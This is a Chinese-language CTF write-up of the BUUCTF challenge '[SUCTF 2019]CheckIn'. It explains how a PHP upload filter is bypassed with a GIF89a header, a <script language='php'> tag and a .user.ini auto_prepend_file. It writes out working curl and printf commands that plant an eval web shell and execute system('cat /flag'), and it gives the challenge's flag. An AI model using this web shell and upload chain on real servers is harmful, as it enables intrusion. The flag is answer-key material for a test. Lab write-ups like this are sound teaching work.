---
title: "[SUCTF 2019]CheckIn"
platform: BUUCTF
category: Web
difficulty: 简单
tags: [file-upload, user-ini, bypass-filter, nginx-php-fpm]
vulnerability: 文件上传过滤不严，可通过 .user.ini 配置文件实现任意代码执行
solved: true
flag: "flag{1047472f-f695-43af-8558-f22564af17b9}"
---

# [SUCTF 2019]CheckIn

## 题目概述
题目是一个文件上传页面，需要上传文件并执行 PHP 代码获取 flag。

## 信息收集
1. 访问页面发现是文件上传功能
2. 测试上传 PHP 文件，发现存在后缀过滤：`illegal suffix!`
3. 测试上传图片后缀但包含 `<?` 内容，发现内容过滤：`<? in contents!`
4. 测试上传图片后缀但无图片头，发现 `exif_imagetype:not image!`

## 漏洞分析（漏洞类型、原理、判断过程）

**漏洞类型**：文件上传 + 配置文件注入

**过滤机制**：
1. 后缀黑名单过滤（禁止 php、php5、phtml 等）
2. 内容过滤（禁止 `<?` 标签）
3. 图片类型检测（`exif_imagetype()` 函数）

**绕过方法**：
1. **内容过滤绕过**：使用 `<script language="php">...</script>` 替代 `<?php ... ?>`（PHP 5.x 支持）
2. **图片类型绕过**：添加 GIF 文件头 `GIF89a` 通过 `exif_imagetype()` 检测
3. **代码执行绕过**：上传 `.user.ini` 配置文件，利用 `auto_prepend_file` 指令自动包含恶意文件

**原理**：
- `.user.ini` 是 PHP 的用户自定义配置文件，在 Nginx+PHP-FPM 环境下生效
- `auto_prepend_file` 指令会在每个 PHP 文件执行前自动包含指定文件
- 上传目录中存在 `index.php`，访问它时会自动包含我们上传的恶意 GIF 文件

## 利用过程（Payload + Flag）

**Step 1：上传恶意 GIF 文件**
```bash
# 构造恶意 GIF 文件（绕过 <? 过滤和图片检测）
printf 'GIF89a<script language="php">@eval($_POST["cmd"]);</script>' > shell.gif

# 上传
curl -F "fileUpload=@shell.gif;filename=shell.gif" -F "upload=提交" "http://target/index.php"
```

**Step 2：上传 .user.ini 配置文件**
```bash
# 构造 .user.ini（包含恶意 GIF）
printf 'GIF89a\nauto_prepend_file=shell.gif' > .user.ini

# 上传
curl -F "fileUpload=@.user.ini;filename=.user.ini" -F "upload=提交" "http://target/index.php"
```

**Step 3：执行命令获取 flag**
```bash
# 访问 index.php 触发代码执行
curl -X POST -d "cmd=system('cat /flag');" "http://target/uploads/xxx/index.php"

# 返回：flag{1047472f-f695-43af-8558-f22564af17b9}
```

## 复现步骤
1. 构造带 GIF 头的恶意 PHP 文件（使用 script 标签绕过 `<?` 过滤）
2. 构造 `.user.ini` 文件，设置 `auto_prepend_file=恶意文件名`
3. 依次上传恶意文件和 `.user.ini`
4. 访问上传目录下的 `index.php`，POST 参数执行命令

## 技术总结（表格：漏洞类型/攻击入口/核心Payload/知识点）

| 漏洞类型 | 攻击入口 | 核心 Payload | 知识点 |
|---------|---------|-------------|--------|
| 文件上传 | 文件上传接口 | `.user.ini` + `auto_prepend_file` | PHP 配置文件利用 |
| 过滤绕过 | 内容检测 | `<script language="php">` | PHP 短标签变体 |
| 类型检测 | `exif_imagetype()` | `GIF89a` 文件头 | 图片文件头伪造 |

## 知识总结（解题技巧、同类题型套路）

1. **`.user.ini` 利用条件**：Nginx+PHP-FPM 环境，上传目录有 PHP 文件
2. **PHP 代码标签变体**：
   - `<?php ... ?>` - 标准标签
   - `<? ... ?>` - 短标签（需 `short_open_tag=On`）
   - `<script language="php">...</script>` - script 标签（PHP 5.x 支持，PHP 7 移除）
   - `<% ... %>` - ASP 风格（需 `asp_tags=On`）
3. **文件上传绕过套路**：后缀→内容→类型检测，逐层分析逐层绕过
